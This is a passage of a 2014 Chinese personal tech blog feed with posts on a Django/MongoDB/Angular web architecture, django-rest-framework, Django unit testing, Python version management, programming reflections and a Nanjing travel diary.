&lt;p&gt;edX的课程制作部分极其强大，与用户有大量的交互，有大量数据在与后端往来，如果手动操作DOM手动写ajax，估计要累的半死，而且极其容易出错。&lt;/p&gt;
&lt;p&gt;backbone.js是前端mvc框架，不仅为代码提供了组织结构，还为我们干了大量杂活，让我们可以专注数据和业务逻辑，当然时下更流行的是angular.js.我也觊觎很久了，不过没怎么在项目中实践过，看了又忘。&lt;/p&gt;
&lt;p&gt;此外CSS预处理器使用Scss,js预处理器使用coffeescript，前端自动化使用grunt.js，（依赖于nodejs）&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;我的架构方案&lt;/h1&gt;
&lt;p&gt;好啦，是时候亮出我从edX学到的架构方案啦，其实大多内容就是对上边做个总结。  &lt;/p&gt;
&lt;p&gt;当当当当&lt;/p&gt;
&lt;h2&gt;服务器&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;nginx&lt;/li&gt;
&lt;li&gt;gunicore&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;数据库&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;mysql&lt;/li&gt;
&lt;li&gt;mongo&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;mysql跟django紧密结合，主要使用其用户模块功能，其实这一部分功能强大之极。基本功能由django的auth模块提供，django还为我们提供了session（会话），csrf（安全性）等功能，几乎不花功夫就能得到的特性。真是免费的午餐&lt;/p&gt;
&lt;h2&gt;后端&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;django&lt;/li&gt;
&lt;li&gt;django-rest-framework&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;django作为核心框架，提供了骨架和组织方式。&lt;/p&gt;
&lt;p&gt;django-rest-framework为我们对外提供restful风格的api接口&lt;/p&gt;
&lt;p&gt;重要的是！！&lt;/p&gt;
&lt;p&gt;提供这些api接口几乎不费事，只要定义好model就几乎万事大吉了！包括麻烦的用户认证和权限等问题都有现成的解决方案&lt;/p&gt;
&lt;p&gt;至于mongo部分，就由pymongo来操作，pymongo操作mongo，其舒适程度与使用orm无异，且查找功能还更清晰明了。当然这主要是mongo本身的特性。&lt;/p&gt;
&lt;h2&gt;前端&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;angular.js&lt;/li&gt;
&lt;li&gt;bootstrap&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;angular.js与后端的django-rest-framework提供的接口交互  &lt;/p&gt;
&lt;p&gt;如此一来，模板使用angular.js的就行，不需要django的模板了，也避免符号问题&lt;/p&gt;
&lt;p&gt;这样大多页面都是无刷新的！&lt;/p&gt;
&lt;p&gt;很适合做大型web应用&lt;/p&gt;
&lt;p&gt;自适应采用bootstrap&lt;/p&gt;
&lt;h2&gt;为移动端提供接口&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;nodejs&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我最近正在做这一部分，使用nodejs来应对大量的并发请求。&lt;/p&gt;
&lt;p&gt;数据来源，使用nodejs直接操控mongo，用户权限方面直接读取mysql中的数据表&lt;/p&gt;
&lt;p&gt;当然nodejs有这两个数据库的orm&lt;/p&gt;
&lt;h2&gt;问题&lt;/h2&gt;
&lt;p&gt;目前存在问题，以及可能的解决方案:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mongo数据如何交给django-rest-framework返回给前端，django-rest-framework功能很全，可以重点用其序列化的功能&lt;/li&gt;
&lt;li&gt;重定向问题，前端来控制，或是使用response&lt;/li&gt;
&lt;li&gt;django本身提供的许多特性，django-rest-framework都支持吗？ 从文档上看，绝大多数核心功能都支持&lt;/li&gt;
&lt;li&gt;好像存在一个内在矛盾，django-rest-framework需要model，而model本身是结构化的，就是说django和mongo其实不怎么关联。  这部分让django-rest-framework只处理序列化的工作。也就是说django-rest-framework在标准接口中用快捷方式，否则用底层更灵活的方式&lt;/li&gt;
&lt;li&gt;让mongo专注于提供文档数据，django-rest-framework来处理权限&lt;/li&gt;
&lt;li&gt;让mysql用字段去记录mongo文档对象的id？相当于外键？还是让mongo中记录user id，来管理用户与数据。后者似乎更恰当。 django在后端负责验证，提取request，本质是sessin，而session本质是核对过的用户名与密码，如果用户是他宣称的身份，则允许这个身份操作自己的数据。以上分析中我们学会这样一种方法，id可以用来关联两者，作为定位符，实际上这也是外键的本质。同时我们发现后端其实无所不能，那里混沌未开，一切数据都可以随意流动，我们人为地对其做限制，划分权职，我们采用身份，权限这些概念，让逻辑清晰，这样才可以映射现实，从而为现实服务,本质是我们在运用逻辑和概念，语言和框架是实施和表达这些想法的工具。&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 12 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-12:bulid_website.html</guid><category>web</category></item><item><title>编程相关</title><link>/code.html</link><description>&lt;h3&gt;一些自己的心得记录，不论对错都记录&lt;/h3&gt;
&lt;hr /&gt;
&lt;h2&gt;对钩子的误解&lt;/h2&gt;
&lt;p&gt;以为钩子越多越复杂，诸如阅读pelican文档时&lt;/p&gt;
&lt;p&gt;其实一旦你知道架构/原理，1个钩子和10个钩子没有区别，越多反而越方便&lt;/p&gt;
&lt;p&gt;需要时查阅文档就行，而不是一来就阅读所有钩子文档。&lt;/p&gt;
&lt;p&gt;看文档重在看原理/结构。琐事的东西忽视它，需要时再来查询&lt;/p&gt;
&lt;p&gt;如何让钩子不污染命名空间，通过架构时设计实现，平时不要把他们暴露出来，把它们集中丢到某个命名空间里。需要时才去引用&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;消除对mongo的恐惧&lt;/h2&gt;
&lt;p&gt;对mongo的恐惧来自于认为一种误解，认为文档（基本的存储单位,类似json对象）是随意丢进数据库的&lt;/p&gt;
&lt;p&gt;实际上逻辑上mongo的数据依然是树状结构，可以类比关系数据库，mongo/db/collection/document，对应于DB/databsse/table/field/，认识到结构清晰，那么就知道如何操作了，恐惧感消失&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;用好一门语言&lt;/h2&gt;
&lt;p&gt;的确有许多东西是语言无关的，而且这些东西往往也比语言本身重要得多。&lt;/p&gt;
&lt;p&gt;但这不代表你可以不深入一门语言  &lt;/p&gt;
&lt;p&gt;良好的策略是两者兼修，而不是放弃一个  &lt;/p&gt;
&lt;p&gt;语言往往是载体，你最终的表达要落实到具体某门语言上，虽然用其他语言也是没问题的，但尽量有一门你擅长的。能用它自如地表达你的想法。  &lt;/p&gt;
&lt;p&gt;能做到表达的时候，不会被语法细节之类的琐事打断 &lt;/p&gt;
&lt;p&gt;我用中文和和英文当然都能写东西，但是表达起来的舒适感是不同的，你写着很难受，频繁被语法等琐事打断，很可能导致你没心情写下去。&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;关于算法&lt;/h2&gt;
&lt;p&gt;算法是一种思想（解决方案）的表现形式&lt;/p&gt;
&lt;p&gt;机器本身只能进行纯粹的运算，她不理解背后的意义。算法使计算拥有意义，可以用来解决特定问题&lt;/p&gt;
&lt;h2&gt;关于存储&lt;/h2&gt;
&lt;p&gt;存储的物理本质是保持某种状态&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;算法意义&lt;/h2&gt;
&lt;p&gt;算法进行动作，最终数据到达某种状态&lt;/p&gt;
&lt;p&gt;如果将现实状态映射到数据状态，那么现实问题就可以通过算法解决，可运算。  &lt;/p&gt;
&lt;p&gt;映射通过函数实现&lt;/p&gt;
&lt;p&gt;这是个极好的框架&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;关于规范&lt;/h2&gt;
&lt;p&gt;当数据结构稳定下来的时候，面对变化需求，还可以考虑采用约定（规范）来解决问题&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 10 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-10:code.html</guid><category>杂感</category></item><item><title>使用django-rest-framework建立RESTful风格的api</title><link>/django-rest-framework-1.html</link><description>&lt;h2&gt;背景&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.django-rest-framework.org/api-guide/serializers"&gt;django-rest-framework&lt;/a&gt;的文档也看过好几回了。&lt;br /&gt;
由于没在实际项目中使用过，真是边看边忘。&lt;br /&gt;
backbone.js/angular.js等框架也类似，看的时候觉得学会了，可时间一长，又只记得个大概&lt;br /&gt;
这种把逻辑移到前端，后端只提供稳定的api接口。想想都觉得美好  &lt;/p&gt;
&lt;h2&gt;为何使用RESTful风格&lt;/h2&gt;
&lt;p&gt;一旦我们使用这种架构，后端只需提供api，把业务逻辑交给前端，一来是界面不需要刷新了，用户体验好，而来对于逻辑复杂的前端，业务逻辑都封装在前段，后端基本稳定不变&lt;/p&gt;
&lt;h2&gt;在django中使用&lt;/h2&gt;
&lt;p&gt;前端使用backbone.js/angular.js，后端使用&lt;a href="http://www.django-rest-framework.org/api-guide/serializers"&gt;django-rest-framework&lt;/a&gt;&lt;br /&gt;
如此一来后端只需定义好models,剩下的工作交给django-rest-framework,就ok啦！
之后将api独立到一个app里，如此依赖，数据层十分稳定，这是多好的事啊！  &lt;/p&gt;
&lt;p&gt;前后端数据使用json来传输，简单清晰&lt;/p&gt;
&lt;h3&gt;django中使用json&lt;/h3&gt;
&lt;p&gt;既然说到json，就顺便也记个笔记好了。&lt;/p&gt;
&lt;h4&gt;django和json相关资源&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/serialization/"&gt;Serializing Django objects&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/bradjasper/django-jsonfield/blob/master/jsonfield/tests.py#L155"&gt;django-jsonfield&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;django-jsonfield本质上提供了一个字段允许直接存取json，自动做了序列化工作，将字段定义为sonfield的好处是这个字段可以用来处理数据结构不稳定的需求部分，json自身是树状数据结构，而存储进去的实质是字符串，所以可以随意修改&lt;br /&gt;
其实直接使用mongo数据库就可以做到。&lt;/p&gt;
&lt;h2&gt;关键概念：序列化&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;透过网络传送资料时进行编码的过程，可以是字节或是XML等格式。而字节的或XML编码格式可以还原完全相等的对象。这程序被应用在不同应用程式之间传送对象，以及服务器将对象储存到档案或数据库。相反的过程又称为反序列化。&lt;/li&gt;
&lt;li&gt;序列化是将对象状态转换为可保持或传输的形式的过程。序列化的补集是反序列化，后者将流转换为对象。这两个过程一起保证数据易于存储和传输。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;起步&lt;/h2&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 10 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-10:django-rest-framework-1.html</guid><category>django</category></item><item><title>索引</title><link>/gist-1.html</link><description>&lt;h1&gt;按语言分&lt;/h1&gt;
&lt;h2&gt;python&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/534c6d343b25c210faf8.git"&gt;pymongo_operate.py SEC&lt;/a&gt; Python操作MongoDB&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/wwj718/cc10a641e5718abee03e"&gt;easy_django.py&lt;/a&gt;   简单轻巧的Django，最简启动方式&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/wwj718/a5a93d7d9cb9572b4fc9"&gt;django_404.html SE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/wwj718/08886626d0d499ffdab4"&gt;django_templates_base.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/wwj718/7edd44a2df4a9d2192e2"&gt;tests.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;html&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/wwj718/e2c3f4c29b43ffb96d9d"&gt;bootstrap2-begin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/wwj718/7460403"&gt;bootstrap3-start.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/wwj718/4c453b74bf1372a893c4"&gt;html5_start&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;其他&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/wwj718/7164189"&gt;一些CDN公共库，常用的js，css公共库&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;一旦代码片段被纳入近来，它就进入我们的视野，有了成长改良的机会，这也是git和wiki很有趣的特性&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 10 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-10:gist-1.html</guid><category>gist</category></item><item><title>仓库与索引</title><link>/gist-init.html</link><description>&lt;p&gt;最近想寻找有效的方式来存储代码片段。&lt;/p&gt;
&lt;p&gt;此前遇到的问题是代码片段创建时随意一扔，需要用时，寻找十分费劲  &lt;/p&gt;
&lt;p&gt;以至于不如使用google重新搜索&lt;/p&gt;
&lt;p&gt;这样实际上浪费了之前的工作&lt;/p&gt;
&lt;h2&gt;解决方案&lt;/h2&gt;
&lt;h4&gt;基本想法&lt;/h4&gt;
&lt;p&gt;将github的的gist视为代码片段仓库&lt;br /&gt;
仓库本身只负责存储&lt;br /&gt;
在博客中建立索引，实际就是url链接&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;此前代码片段无法使用的原因是：手动去仓库中寻找片段，十分繁琐&lt;/p&gt;
&lt;p&gt;这里的关键概念是 仓库和索引。 &lt;/p&gt;
&lt;p&gt;让仓库保持无序，好处在于可以随意将代码片段丢进去&lt;/p&gt;
&lt;p&gt;让索引来将整理信息，人性化接口&lt;/p&gt;
&lt;h2&gt;类似问题&lt;/h2&gt;
&lt;p&gt;目前我面临许多类似问题&lt;br /&gt;
诸如印象笔记  &lt;/p&gt;
&lt;p&gt;一年不到的时间，记了1500+条笔记&lt;/p&gt;
&lt;p&gt;目前存在许多分类重叠，分类不当，tag使用不当，tag缺失的问题&lt;/p&gt;
&lt;p&gt;带来的后果就是，我知道我笔记里有许多问题的解决方案，寻找它却十分费劲&lt;/p&gt;
&lt;p&gt;实际上是缺乏设计，缺乏整理&lt;/p&gt;
&lt;p&gt;只有数据入库的过程，而在赋予源信息meta的过程不够用心，同时缺乏定期的归纳整理&lt;/p&gt;
&lt;h2&gt;参考方案&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;附加设计过的meta信息&lt;/li&gt;
&lt;li&gt;定期整理&lt;/li&gt;
&lt;li&gt;增删合并&lt;/li&gt;
&lt;li&gt;分门别类&lt;/li&gt;
&lt;li&gt;建立高一层的索引&lt;/li&gt;
&lt;li&gt;学习别人的做法&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 10 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-10:gist-init.html</guid><category>gist</category></item><item><title>关于抽象</title><link>/about-abstract.html</link><description>&lt;p&gt;最近捡起《CODE COMPLETE》，从头开始读。&lt;br /&gt;
虽然在校期间读过一些，再次捡起来的时候，依然是被各种惊艳到，酣畅淋漓。&lt;br /&gt;
近1000页的纯技术砖头能写得这般生动，也实属罕见。&lt;br /&gt;
难怪有读者在亚马逊评论道：这是程序员可以带到荒岛的唯一一本书。&lt;br /&gt;
简直是可以就着咖啡看月色的好书。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;《CODE COMPLETE》第五章谈论软件构建中的设计时谈到抽象。&lt;/p&gt;
&lt;p&gt;精妙之极。&lt;/p&gt;
&lt;p&gt;作者说道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;抽象是一种能让你在关注某一概念的同时可以放心忽略其中一些细节的能力--在不同的层次处理不同的细节。任何时候当你在对一个聚合物品工作时，你就在用抽象了。当你把一个东西称为“房子”而不是由玻璃，木材和钉子构成的组合体时，你就在用抽象了。当你把一组房屋称为“城镇”时，你还是在用抽象。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我在阅读edX源码前，其实没有怎么认真阅读过大型项目，虽然也在github上翻阅过一些项目，不过基本凭借笔记和记忆可以就弄清大多细节。&lt;/p&gt;
&lt;p&gt;初次面对edX的时候，就像你一贯打小兵打得顺手，前头来了个大boss，手足无措。&lt;/p&gt;
&lt;p&gt;阅读的过程颇有捡了籽麻，丢了西瓜的感觉。&lt;/p&gt;
&lt;p&gt;前不着村，后不着店的。&lt;/p&gt;
&lt;p&gt;问题的症结在于，一直抓着细节不妨，基于这样一个错误观念--“它们是相互关联的”。&lt;/p&gt;
&lt;p&gt;这正是20世纪软件工程面临的危机之一，软件工程的复杂度越来越高，而我们的智力却有局限。&lt;/p&gt;
&lt;p&gt;如何降解复杂度?&lt;/p&gt;
&lt;p&gt;抽象。&lt;/p&gt;
&lt;p&gt;抽象让我们可以放心地忽略其中一些细节，这样我们就能将注意力每时每刻只关注某一方面。  &lt;/p&gt;
&lt;p&gt;可为何忽视细节却不会带来麻烦呢，这便是20世纪的软件工程致力于解决的为题。&lt;/p&gt;
&lt;p&gt;为了降解复杂度，人们折腾出了许多的抽象工具，面向对象技术便是其中之一。&lt;/p&gt;
&lt;p&gt;有些概念虽然常常与面向对象纠缠不清，诸如封装，诸如信息隐藏，我觉得它们实际上很独立，不局限于某种编程范式内。&lt;/p&gt;
&lt;p&gt;他们更像一种启发式思维，而不是具体的方法论。&lt;/p&gt;
&lt;p&gt;抽象这东西实际是一种思维工具。&lt;/p&gt;
&lt;p&gt;它独立于语言，甚至独立于编程，它是一种思维方式，几乎对处理一切事物都能起到降解复杂度的作用，有一种掉入山洞，偶得秘籍的感觉。&lt;/p&gt;
&lt;p&gt;今天上班的时候，试着用这种思路去理解edx，面对这个盘然大物，之前束手无策，在代码丛林里，其实颇有盲人摸象的感觉，一直不见森林。&lt;/p&gt;
&lt;p&gt;在大胆抛开细节后，居然可以理出头绪了。&lt;/p&gt;
&lt;p&gt;其实之前何曾不想抛开，可是抓不准什么是可以丢弃的信息。&lt;/p&gt;
&lt;p&gt;而在了解了 设计人员在设计时，其实也用了这些思维工具，剩下的细节就是了解隐藏信息和封装之类具体的技巧了，如此一来可以很快理解设计人员的思路。&lt;/p&gt;
&lt;p&gt;这样，我们可以穿梭于各个层面。分析系统架构时，站在高层（只看接口），而深入细节时，才进入代码。&lt;/p&gt;
&lt;p&gt;站在高层分析时，使用图示，而深入代码时，记录出入口数据。&lt;/p&gt;
&lt;p&gt;第一次感觉到你能用你的思维本身来对抗复杂度。它是实实在在的工具啊！简直削铁如泥一般，虽然看不见摸不着。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 03 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-03:about-abstract.html</guid><category>随笔</category></item><item><title>南京纪游之二</title><link>/nanjing-2.html</link><description>&lt;p&gt;都上上周的事了，才想起来记下一笔。&lt;/p&gt;
&lt;p&gt;朋友来玩，恰逢周末。&lt;/p&gt;
&lt;p&gt;恰逢好友。&lt;/p&gt;
&lt;p&gt;早上睡了个懒觉，醒来已经可以吃午饭了。&lt;/p&gt;
&lt;p&gt;顺路去车站。&lt;/p&gt;
&lt;p&gt;天欲雨，将下未下的感觉。我依旧是忘了带伞。&lt;/p&gt;
&lt;p&gt;有朋自远方来。&lt;/p&gt;
&lt;p&gt;安置好行李，去狮子桥小吃街，这是我在南京吃过最美味的汤包，鲜美而不腻。&lt;/p&gt;
&lt;p&gt;小桥画舫的秦淮河，其实去过一回就没什么意思了，奈何名气在外，几乎每个来南京玩的游客，几乎都会主动地或是被动地来到这里。&lt;/p&gt;
&lt;p&gt;在景区看到一套手绘的明信片，很喜欢其中的阅江楼，想起答应过给朋友寄。&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;次日，徒步逛完南京长江大桥，站在桥上的时候，风雨欲来，倒是颇为壮观。逝水东流，往来大船，风起云涌。&lt;/p&gt;
&lt;p&gt;下了桥一看都错过午饭时间了。不巧下起大雨。&lt;/p&gt;
&lt;p&gt;去莫愁湖！&lt;/p&gt;
&lt;p&gt;莫愁烟雨可是金陵48景之首。虽然估计得今天只能看莫愁暴雨。&lt;/p&gt;
&lt;p&gt;我都想好了，下雨呢，就看莫愁烟雨，天晴就看燕矶夕照。&lt;/p&gt;
&lt;p&gt;在南京站下车的时候，发现雨中的玄武湖，简直美得不似人间，眼前的风景简直就是对烟雨江南最好的注解。&lt;/p&gt;
&lt;p&gt;上船吧，暴雨乘船，实在也是有趣之极的事。恰好和朋友想到一处&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;访戴何须雪满山&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;waiting  蚊子忒多，买一蚊香去先。。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 03 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-03:nanjing-2.html</guid><category>随笔</category></item><item><title>django测试</title><link>/django-test.html</link><description>&lt;p&gt;在单元测试方面，Django继承python的&lt;a href="https://docs.python.org/3/library/unittest.html#module-unittest"&gt;unittest&lt;/a&gt;.TestCase实现了自己的django.test.TestCase，编写测试用例通常从这里开始。测试代码通常位于app的tests.py文件中&lt;/p&gt;
&lt;h2&gt;为何要在django中使用test&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;When you’re writing new code, you can use tests to validate your code works as expected.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;When you’re refactoring or modifying old code, you can use tests to ensure your changes haven’t affected your application’s behavior unexpectedly.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;With Django’s test-execution framework and assorted utilities, you can simulate requests, insert test data, inspect your application’s output and generally verify your code is doing what it should be doing.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Writing and running tests&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;from django.test import TestCase
from myapp.models import Animal

class AnimalTestCase(TestCase):
    def setUp(self):
        Animal.objects.create(name=&amp;quot;lion&amp;quot;, sound=&amp;quot;roar&amp;quot;)
        Animal.objects.create(name=&amp;quot;cat&amp;quot;, sound=&amp;quot;meow&amp;quot;)

    def test_animals_can_speak(self):
        &amp;quot;&amp;quot;&amp;quot;函数必须以text_xx命名方式&amp;quot;&amp;quot;&amp;quot;
        lion = Animal.objects.get(name=&amp;quot;lion&amp;quot;)
        cat = Animal.objects.get(name=&amp;quot;cat&amp;quot;)
        self.assertEqual(lion.speak(), &amp;#39;The lion says &amp;quot;roar&amp;quot;&amp;#39;)
        self.assertEqual(cat.speak(), &amp;#39;The cat says &amp;quot;meow&amp;quot;&amp;#39;)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你可以有几种方式运行单元测试：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;python manage.py test：执行所有的测试用例&lt;/li&gt;
&lt;li&gt;python manage.py test app_name, 执行该app的所有测试用例&lt;/li&gt;
&lt;li&gt;python manage.py test app_name.case_name: 执行指定的测试用例&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Testing tools:Overview and a quick example&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; from django.test.client import Client
&amp;gt;&amp;gt;&amp;gt; c = Client()
&amp;gt;&amp;gt;&amp;gt; response = c.post(&amp;#39;/login/&amp;#39;, {&amp;#39;username&amp;#39;: &amp;#39;john&amp;#39;, &amp;#39;password&amp;#39;: &amp;#39;smith&amp;#39;})
&amp;gt;&amp;gt;&amp;gt; response.status_code
200
&amp;gt;&amp;gt;&amp;gt; response = c.get(&amp;#39;/customer/details/&amp;#39;)
&amp;gt;&amp;gt;&amp;gt; response.content
&amp;#39;&amp;lt;!DOCTYPE html...&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;The request factory&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;from django.contrib.auth.models import User
from django.test import TestCase, RequestFactory

class SimpleTest(TestCase):
    def setUp(self):
        # Every test needs access to the request factory.
        self.factory = RequestFactory()
        self.user = User.objects.create_user(
            username=&amp;#39;jacob&amp;#39;, email=&amp;#39;jacob@…&amp;#39;, password=&amp;#39;top_secret&amp;#39;)

    def test_details(self):
        # Create an instance of a GET request.
        request = self.factory.get(&amp;#39;/customer/details&amp;#39;)

        # Recall that middleware are not supported. You can simulate a
        # logged-in user by setting request.user manually.
        request.user = self.user

        # Test my_view() as if it were deployed at /customer/details
        response = my_view(request)
        self.assertEqual(response.status_code, 200)
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;unit test file upload in django&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;c = Client()
with open(&amp;#39;wishlist.doc&amp;#39;) as fp:
  c.post(&amp;#39;/customers/wishes/&amp;#39;, {&amp;#39;name&amp;#39;: &amp;#39;fred&amp;#39;, &amp;#39;attachment&amp;#39;: fp})
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/testing/"&gt;Testing in Django&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.6/topics/testing/tools/"&gt;Testing tools&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/testing/overview/"&gt;Writing and running tests&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/thinkinside/article/details/7227921"&gt;Django实战（10）：单元测试&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.oschina.net/translate/django-1-6-test-driven-development"&gt;Django 1.6 的测试驱动开发&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 31 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-31:django-test.html</guid><category>django</category></item><item><title>python多版本安装笔记</title><link>/python2-python3.html</link><description>&lt;p&gt;在同一台机器上使用不同的python版本&lt;/p&gt;
&lt;h3&gt;方法一&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;使用&lt;a href="https://github.com/yyuu/pyenv"&gt;pyenv&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git clone git://github.com/yyuu/pyenv.git ~/.pyenv
$ echo &amp;#39;export PYENV_ROOT=&amp;quot;$HOME/.pyenv&amp;quot;&amp;#39; &amp;gt;&amp;gt; ~/.bashrc
$ echo &amp;#39;export PATH=&amp;quot;$PYENV_ROOT/bin:$PATH&amp;quot;&amp;#39; &amp;gt;&amp;gt; ~/.bashrc
$ echo &amp;#39;eval &amp;quot;$(pyenv init -)&amp;quot;&amp;#39; &amp;gt;&amp;gt; ~/.bashrc
$ exec $SHELL -l
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;方法二&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo apt-get install python3&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;安装pip3：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd /tmp
wget https://raw.github.com/pypa/pip/master/contrib/get-pip.py
sudo python3 get-pip.py
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://seisman.info/python-pyenv.html"&gt;Python多版本共存之pyenv&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/11268501/how-to-use-pip-with-python-3-x-alongside-python-2-x"&gt;how-to-use-pip-with-python-3-x-alongside-python-2-x&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 30 Jul 2014 00:00:00 +0000</pubDate><guid>tag:,2014-07-30:python2-python3.html</guid><category>python</category></item><item><title>七牛云使用笔记</title><link>/qiniu.html</link><description>&lt;h2&gt;安装&lt;/h2&gt;
&lt;p&gt;pip install qiniu&lt;/p&gt;
&lt;h2&gt;ACCESS_KEY 和 SECRET_KEY&lt;/h2&gt;
&lt;p&gt;在使用SDK 前，您需要拥有一对有效的 AccessKey 和 SecretKey 用来进行签名授权。
&lt;a href="https://portal.qiniu.com/setting/key"&gt;登陆查看Access Key和Secret Key&lt;/a&gt;&lt;/p&gt;
